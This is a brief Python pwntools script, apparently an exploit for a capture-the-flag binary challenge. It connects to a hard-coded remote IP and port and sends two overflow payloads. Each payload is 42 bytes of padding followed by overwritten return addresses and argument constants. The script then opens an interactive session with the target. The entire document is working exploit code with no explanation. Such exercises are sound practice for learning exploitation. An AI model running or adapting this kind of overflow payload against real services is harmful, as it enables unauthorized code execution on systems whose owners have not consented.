from pwn import *


p=remote("3.92.136.78",5010)

payload=""
payload+="A"*42
payload+=p32(0x8048506)
payload+=p32(0x80485f4)
payload+=p32(0xdeadbeef)
payload+=p32(0xc0febabe)

p.sendline(payload)

payload=""
payload+="A"*42
payload+=p32(0x8048567)
payload+="JUNK"
payload+=p32(0x12345678)
payload+=p32(0x87654321)
p.sendline(payload)
p.interactive()